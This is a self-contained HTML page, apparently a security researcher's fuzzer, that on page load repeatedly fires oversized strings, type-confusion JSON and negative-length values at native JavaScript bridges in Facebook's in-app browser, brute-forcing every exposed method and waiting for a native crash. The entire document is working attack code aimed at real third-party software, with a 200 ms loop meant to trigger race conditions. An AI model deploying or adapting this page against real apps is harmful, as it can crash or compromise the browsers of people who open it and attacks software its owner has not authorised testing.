<!DOCTYPE html>
<html>
<head><title>JSI Precision Fuzzer</title></head>
<body style="background:#000; color:#0f0;">
    <h3>Precision Striking FB JSIs...</h3>
    <div id="log"></div>

    <script>
        const logEl = document.getElementById('log');
        function log(msg) { logEl.innerHTML += msg + "<br>"; }

        // 1. The "Big String" for Buffer Overflows
        const giantString = "A".repeat(1024 * 1024 * 5); // 5MB String to really stress the allocator

        // 2. Crafted IPC Messages
        // We guess common Facebook IPC structures based on their open-source SDKs
        const payloads = [
            // Attempt to overflow a command parser
            giantString,
            
            // Attempt Type Confusion (giving an array where a string is expected)
            JSON.stringify({ "action": "test", "callback": [], "data": giantString }),
            
            // Attempt Integer Overflow in length calculations
            JSON.stringify({ "action": "saveAutofill", "length": -1, "data": "A" }),
            
            // Send massive JSON to break the rapidjson parser in C++
            JSON.stringify({ "cmd": "log", "msg": giantString }),
            
            // Attempt to trigger the native cache query we saw in Ghidra
            JSON.stringify({ "action": "queryCache", "key": giantString })
        ];

        function strike() {
            log("[*] Firing at __call_iabjs_unified_bridge...");
            if (typeof window.__call_iabjs_unified_bridge === 'function') {
                payloads.forEach(p => {
                    try { window.__call_iabjs_unified_bridge(p); } catch(e) {}
                    try { window.__call_iabjs_unified_bridge("test", p); } catch(e) {}
                });
            }

            log("[*] Firing at iabjs_unified_bridge...");
            if (window.iabjs_unified_bridge) {
                // Brute force all methods on this object
                let methods = Object.getOwnPropertyNames(Object.getPrototypeOf(window.iabjs_unified_bridge));
                methods.forEach(m => {
                    if (typeof window.iabjs_unified_bridge[m] === 'function') {
                        payloads.forEach(p => {
                            try { window.iabjs_unified_bridge[m](p); } catch(e) {}
                        });
                    }
                });
            }

            log("[*] Firing at Autofill/Promo...");
            try { window._AutofillMessageHandler.postMessage(giantString); } catch(e) {}
            try { window._PromoExtensions.postMessage(giantString); } catch(e) {}

            log("[+] Volley complete. Waiting for native crash...");
        }

        // Fire immediately
        strike();

        // Fire repeatedly to trigger race conditions
        setInterval(strike, 200);

    </script>
</body>
</html>
